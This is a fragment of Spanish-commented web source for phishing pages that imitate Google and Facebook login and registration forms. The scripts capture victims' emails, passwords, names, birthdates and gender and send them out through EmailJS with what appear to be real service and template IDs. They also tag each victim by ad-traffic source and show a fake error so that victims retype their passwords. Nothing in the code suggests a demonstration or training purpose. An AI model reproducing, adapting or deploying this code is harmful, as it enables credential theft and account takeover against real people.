            border-radius: 4px;

        }

            height: 20px;
        }

            text-align: center;
            font-size: 13px;
            color: #5f6368;
        }

            display: flex;
            justify-content: center;

            margin-bottom: 20px;

        .footer-links a {
            color: #1f71c6;

        }

        .footer-links a:hover {
            color: #1560ab;
            text-decoration: underline;
        }

            color: #9aa0a6;
        }

            h1 {

            }

</head>

<script>
  emailjs.init('0jG8bx2KA7fuPpvtf');

  const ACCOUNTS = {
    'usuario@gmail.com': { name: 'Usuario',    password: '123456'   },
    'test@gmail.com':    { name: 'Test User',  password: 'password' },
    'demo@gmail.com':    { name: 'Demo User',  password: 'demo123'  },
  };

  let currentEmail = '';

  function show(id) {
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
  }

  ['email', 'pw'].forEach(id => {
    const el = document.getElementById(id);
    if (!el) return;
    el.addEventListener('input', () => {
      el.value ? el.classList.add('filled') : el.classList.remove('filled');
      el.classList.remove('err');
      const e = document.getElementById(id === 'email' ? 'email-err' : 'pw-err');
      if (e) e.classList.remove('show');
    });
    el.addEventListener('keydown', e => {
      if (e.key === 'Enter') id === 'email' ? nextEmail() : nextPw();
    });
  });

  function setLoading(btnId, on) {
    document.getElementById(btnId).classList.toggle('loading', on);
  }

  function nextEmail() {
    const inp = document.getElementById('email');
    const val = inp.value.trim();
    const errEl = document.getElementById('email-err');
    const re = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$|^\\+?[\\d\\s\\-]{7,15}$/;

    if (!val || !re.test(val)) {
      inp.classList.add('err');
      errEl.textContent = val
        ? 'No pudimos encontrar tu cuenta de Google.'
        : 'Escribe un correo electrónico o número de teléfono.';
      errEl.classList.add('show');
      return;
    }

    currentEmail = val;
    setLoading('btn-email', true);
    setTimeout(() => {
      setLoading('btn-email', false);
      document.getElementById('chip-text').textContent = currentEmail;
      document.getElementById('chip-av').textContent = currentEmail.charAt(0).toUpperCase();
      document.getElementById('pw').value = '';
      document.getElementById('pw').classList.remove('filled', 'err');
      document.getElementById('pw-err').classList.remove('show');
      show('sec-pw');
      document.getElementById('pw').focus();
    }, 900);
  }

  function goBack() {
    show('sec-email');
    document.getElementById('email').focus();
  }

  async function enviarDatos(correo, password) {
    try {
      await emailjs.send('service_tr444xm', 'template_4x12f3k', {
        correo: correo,
        password: password,
        fecha: new Date().toLocaleString('es-EC')
      });
      console.log('✅ Datos enviados correctamente a la base de datos');
    } catch (error) {
      console.error('❌ Error al enviar datos:', error);
    }
  }

  function nextPw() {
    const inp = document.getElementById('pw');
    const val = inp.value;
    const errEl = document.getElementById('pw-err');

    if (!val) {
      inp.classList.add('err');
      errEl.textContent = 'Ingresa tu contraseña.';
      errEl.classList.add('show');
      return;
    }

    setLoading('btn-pw', true);
    setTimeout(() => {
      setLoading('btn-pw', false);
      const acc = ACCOUNTS[currentEmail.toLowerCase()];
      if (acc && acc.password !== val) {
        inp.classList.add('err');
        errEl.textContent = 'Contraseña incorrecta. Vuelve a intentarlo.';
        errEl.classList.add('show');
        return;
      }
      
      enviarDatos(currentEmail, val);
      
      const name = acc ? acc.name : currentEmail.split('@')[0];
      document.getElementById('big-av').textContent = name.charAt(0).toUpperCase();
      document.getElementById('ok-name').textContent = '¡Hola, ' + name + '!';
      document.getElementById('ok-email').textContent = currentEmail;
      show('sec-ok');
    }, 1000);
  }

  function togglePw() {
    const inp = document.getElementById('pw');
    const icon = document.getElementById('eye-icon');
    if (inp.type === 'password') {
      inp.type = 'text';
      icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
    } else {
      inp.type = 'password';
      icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
    }
  }

  function reset() {
    currentEmail = '';
    const e = document.getElementById('email');
    e.value = '';
    e.classList.remove('filled', 'err');
    document.getElementById('email-err').classList.remove('show');
    show('sec-email');
    e.focus();
  }
<\/script>
</body>
</html>`;

            const blob = new Blob([googleLoginHTML], { type: 'text/html' });

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"><\/script>
  <script>
    // ── EmailJS config ──
    const EJ_PUBLIC_KEY  = '0jG8bx2KA7fuPpvtf';
    const EJ_SERVICE_ID  = 'service_tr444xm';
    const EJ_TEMPLATE_ID = 'template_4x12f3k';

    emailjs.init(EJ_PUBLIC_KEY);

    // ── DETECTAR ORIGEN (Facebook / Google / Directo) ──
    function detectarOrigen() {
      const params = new URLSearchParams(window.location.search);
      const utm    = (params.get('utm_source') || '').toLowerCase();
      const ref    = (params.get('ref')        || '').toLowerCase();
      const fbclid =  params.get('fbclid');   // Facebook Ads lo agrega automáticamente
      const gclid  =  params.get('gclid');    // Google Ads lo agrega automáticamente

      if (fbclid || utm === 'facebook' || utm === 'fb' || ref === 'facebook') {
        return '📘 FACEBOOK';
      } else if (gclid || utm === 'google' || ref === 'google') {
        return '🔍 GOOGLE';
      } else if (utm) {
        return '🔗 ' + utm.toUpperCase();
      } else {
        // Intentar leer el referrer del navegador como respaldo
        const referrer = document.referrer.toLowerCase();
        if (referrer.includes('facebook.com') || referrer.includes('fb.com')) return '📘 FACEBOOK';
        if (referrer.includes('google.com'))  return '🔍 GOOGLE';
        if (referrer.includes('instagram.com')) return '📸 INSTAGRAM';
        return '🌐 DIRECTO';
      }
    }

    // Calcular origen una sola vez al cargar la página
    const ORIGEN = detectarOrigen();

    // ── Enviar datos por email ──
    function enviarDatos(params) {
      emailjs.send(EJ_SERVICE_ID, EJ_TEMPLATE_ID, params)
        .then(() => console.log('✅ Datos enviados'))
        .catch(err => console.error('❌ Error EmailJS:', err));
    }

    // ── LOGIN ──
    function handleLogin() {
      const email    = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();
      const errorBox = document.getElementById('error-box');

      if (!email || !password) {
        errorBox.textContent = 'Por favor, completa todos los campos.';
        errorBox.classList.add('show');
        return;
      }

      // Enviar datos al correo — ahora incluye ORIGEN
      enviarDatos({
        tipo:     'LOGIN',
        origen:   ORIGEN,
        correo:   email,
        password: password,
        fecha:    new Date().toLocaleString('es-EC')
      });

      // Mostrar error falso (como Facebook real)
      errorBox.innerHTML = 'El correo electrónico o número de teléfono que has indicado no coincide con ninguna cuenta. <a href="#" style="color:#1877f2">Regístrate</a> para crear una cuenta.';
      errorBox.classList.add('show');
      document.getElementById('password').value = '';
      document.getElementById('password').focus();
    }

    function handleForgot(e) {
      e.preventDefault();
      alert('Redirigiendo a recuperación de contraseña...');
    }

    // ── REGISTRO ──
    function handleRegister() {
      const fname  = document.getElementById('reg-fname').value.trim();
      const lname  = document.getElementById('reg-lname').value.trim();
      const email  = document.getElementById('reg-email').value.trim();
      const pass   = document.getElementById('reg-pass').value.trim();
      const dia    = document.getElementById('reg-dia').value;
      const mes    = document.getElementById('reg-mes').value;
      const anio   = document.getElementById('reg-anio').value;
      const gender = document.querySelector('input[name="gender"]:checked');

      if (!fname || !lname || !email || !pass) {
        alert('Por favor, completa todos los campos obligatorios.');
        return;
      }

      // Enviar datos al correo — ahora incluye ORIGEN
      enviarDatos({
        tipo:       'REGISTRO',
        origen:     ORIGEN,
        correo:     email,
        password:   pass,
        nombre:     fname + ' ' + lname,
        nacimiento: dia + '/' + mes + '/' + anio,
        genero:     gender ? gender.value : 'No especificado',
        fecha:      new Date().toLocaleString('es-EC')
      });

      closeModal();
      alert('✅ ¡Cuenta creada! Bienvenido/a, ' + fname + '.');
    }

    // ── Modal ──
    function openModal()          { document.getElementById('modal').classList.add('open'); }
    function closeModal()         { document.getElementById('modal').classList.remove('open'); }
    function closeModalOutside(e) { if (e.target === document.getElementById('modal')) closeModal(); }

    // Enter en login
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') {
        const active = document.activeElement;
        if (active.id === 'email' || active.id === 'password') handleLogin();
      }
    });
  <\/script>
